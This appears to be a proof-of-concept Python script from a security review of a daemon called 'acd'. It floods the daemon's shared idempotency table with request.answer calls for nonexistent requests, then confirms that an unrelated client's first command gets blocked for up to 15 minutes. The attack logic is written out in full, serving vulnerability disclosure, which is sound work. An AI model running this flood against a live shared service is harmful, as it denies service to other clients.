#!/usr/bin/env python3
"""
Fills acd's daemon-wide idempotency table (crates/acd-core/src/idem.rs,
`IDEM_CAPACITY` = 16,384 entries, one `HashMap<(client_id, id), Entry>`
shared by every connected client) from a single authenticated-but-hostile
peer, using distinct command ids on `request.answer` for request ids that
do not exist. `ping` does NOT work for this (`server.rs` handles it
directly, bypassing the idempotency engine entirely -- confirmed by
trying it first). A nonexistent `request_id` gets `RequestGone` with
`Delivery::Attempted` (crates/acd-core/src/engine.rs, the `let Some(path)
= ... registry.request(...) else { ... Delivery::Attempted }` arm), and
`RequestGone` is not in `cacheable`'s exclusion list
(`RequestNotReady`/`RequestBusy`/`SourceUnavailable`/`RequestChanged`), so
each such answer is cached as `Done` for the full 15-minute TTL. Once
full, `IdemCache::begin` returns `Begin::Full` for *any* client's *next
new* command id -- not just the flooder's -- until enough `Done` entries
age past that TTL. This is a stronger read than
the static review's "Considered and rejected / Idempotency abuse" note
(which reasoned a token holder who fills the table "already has full
control"): it also silently blocks every *other* paired client's and
agent's `request.answer`/`ping` for up to 15 minutes, which is a new,
cross-client denial of service, not just self-harm.

Usage:
    python3 -I idem_table_flood.py --dir <acd config dir> --port <ws port>

Safety: connects only to 127.0.0.1:<port>. Reads the client token from
`<dir>/client.token`. Meant for a disposable test daemon -- it leaves the
daemon's idempotency table full for up to 15 minutes afterward.
"""
import argparse
import os
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import acdws  # noqa: E402


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--dir", required=True)
    ap.add_argument("--port", type=int, required=True)
    ap.add_argument("--fill", type=int, default=16384 + 100,
                     help="distinct command ids to send (default: table "
                          "capacity + a margin)")
    args = ap.parse_args()
    token = open(os.path.join(args.dir, "client.token")).read().strip()

    print("baseline: a second, unrelated client's request.answer "
          "(nonexistent request_id, so the reply is request_gone)...")
    victim = acdws.WS.connect("127.0.0.1", args.port, use_tls=True)
    victim.send_json(acdws.hello_msg(token))
    victim.recv_json(timeout=5)
    victim.recv_json(timeout=5)
    victim.send_json({
        "id": "victim-0", "type": "request.answer",
        "request_id": "victim-nonexistent-0", "option_id": "allow",
    })
    r = victim.recv_json(timeout=5)
    print(f"  -> {r}")
    victim.close()

    print(f"\nflooding {args.fill} distinct-id request.answer calls (each "
          f"for a nonexistent request_id) from one hostile, authenticated "
          f"peer, reading every reply before moving on...")
    attacker = acdws.WS.connect("127.0.0.1", args.port, use_tls=True)
    attacker.send_json(acdws.hello_msg(token))
    attacker.recv_json(timeout=5)
    attacker.recv_json(timeout=5)
    t0 = time.time()
    codes = {}
    for i in range(args.fill):
        cmd_id = f"flood-{i}"
        attacker.send_json({
            "id": cmd_id,
            "type": "request.answer",
            "request_id": f"nonexistent-{i}",
            "option_id": "allow",
        })
        reply = attacker.recv_json(timeout=5)
        code = reply.get("error", {}).get("code")
        codes[code] = codes.get(code, 0) + 1
    print(f"  sent+read {args.fill} in {time.time()-t0:.2f}s; reply codes: {codes}")
    attacker.close()

    print("\nafter the flood: a BRAND NEW, unrelated client's first "
          "command...")
    fresh = acdws.WS.connect("127.0.0.1", args.port, use_tls=True)
    fresh.send_json(acdws.hello_msg(token))
    fresh.recv_json(timeout=5)
    fresh.recv_json(timeout=5)
    fresh.send_json({
        "id": "fresh-client-first-command", "type": "request.answer",
        "request_id": "irrelevant", "option_id": "allow",
    })
    r = fresh.recv_json(timeout=5)
    print(f"  -> {r}")
    if not r.get("ok") and r.get("error", {}).get("code") == "bad_request" \
            and "too many recent commands" in r.get("error", {}).get("message", ""):
        print("  CONFIRMED: a brand-new, unrelated client's very first "
              "command was blocked by the flooder's table exhaustion.")
    else:
        print("  not reproduced this run (raise --fill, or the table "
              "already had free capacity).")
    fresh.close()


if __name__ == "__main__":
    main()
